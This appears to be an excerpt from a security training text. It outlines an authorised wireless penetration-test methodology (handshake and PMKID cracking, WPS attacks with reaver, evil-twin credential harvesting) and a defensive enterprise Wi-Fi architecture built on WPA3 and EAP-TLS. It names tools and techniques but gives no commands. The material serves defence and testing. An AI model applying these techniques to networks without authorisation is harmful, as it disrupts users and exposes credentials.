Scope & safety: confirm SSIDs in scope, allowed techniques (is deauth permitted?), hours, and that a client-DoS during deauth is acceptable; use a dedicated monitor-capable adapter; note that testing may briefly disrupt users. Passive recon: airodump-ng survey — enumerate SSIDs, BSSIDs, channels, encryption (open / WEP / WPA2-PSK / WPA2-Enterprise / WPA3), hidden SSIDs, WPS status (wash), signal reach outside the building (parking-lot test), and rogue/unexpected APs. PSK networks: capture a handshake (wait, or a scoped targeted deauth of one test client) or PMKID; run a time-boxed offline crack with a good wordlist + rules + policy masks — report whether it cracked and how fast, not just yes/no. WPS: for any AP with WPS on and unlocked, note the exposure (and, if in scope, demonstrate with reaver/Pixie-Dust briefly). Enterprise (802.1X): check EAP method, whether certificate validation is enforced on clients (if not, an evil-twin + hostapd-wpe/EAP relay can harvest creds — test only if authorised), and whether the RADIUS/NPS config is hardened. Segmentation: from a connected guest/BYOD SSID, test isolation — can you reach the corporate LAN, management VLANs, other clients? Client isolation on? Rogue/evil-twin: is there detection (WIPS) for a spoofed corporate SSID? Report structure: executive summary (overall wireless posture, top risks); findings each with severity, evidence, affected SSID/AP, and remediation — e.g. "Guest SSID not isolated from corporate VLAN (High)", "WPA2-PSK with a crackable passphrase, recovered in 12 min (High)", "WPS enabled and unlocked on 6 APs (Medium)", "Corporate SSID reaches 40m into the public car park (Low/Info)", "No client-side certificate validation on 802.1X (High)"; and a prioritised roadmap (WPA3 migration, disable WPS, VLAN/isolation fixes, WIPS, passphrase/cert policy).

Advanced deep

Design a secure enterprise wireless architecture that makes aircrack-ng, reaver, and evil-twin attacks ineffective, with monitoring.
Authentication: WPA3-Enterprise with EAP-TLS (mutual certificates) — no shared PSK to crack, no password to phish; devices enrolled via MDM/SCEP with client certs, RADIUS (NPS/ISE/FreeRADIUS) validating the client cert chain and the clients configured to validate the RADIUS server cert and pinned CN/CA (this is what defeats evil-twin/hostapd-wpe credential harvesting — without server-cert validation, EAP is phishable). WPA3-only SSIDs where the fleet supports it; a separate, tightly-scoped transitional or legacy SSID only for devices that truly can't do WPA3/EAP-TLS, on an isolated VLAN with extra monitoring. Enable Protected Management Frames (802.11w) everywhere — mitigates deauth/disassoc floods. No WPS anywhere; enforce via the controller config and audit for it. Segmentation: role-based VLAN/SGT assignment from RADIUS (employee / BYOD / IoT / guest), each isolated; client isolation on guest and IoT; guest SSID egress-only to the internet through a filtering proxy, no route to internal; IoT SSID default-deny with per-device allow-lists; wireless management plane (controller, AP mgmt) on a dedicated wired VLAN unreachable from any SSID. PSK where unavoidable (IoT that can't do EAP): long random per-SSID passphrase or, better, WPA3-SAE (offline-attack resistant) or Private PSK / iPSK (per-device keys) so one leaked key isn't the whole network; rotate; keep those devices on the locked-down IoT VLAN. RF hygiene: minimise coverage bleed outside the premises (power tuning, directional antennas at the perimeter), disable legacy low rates.
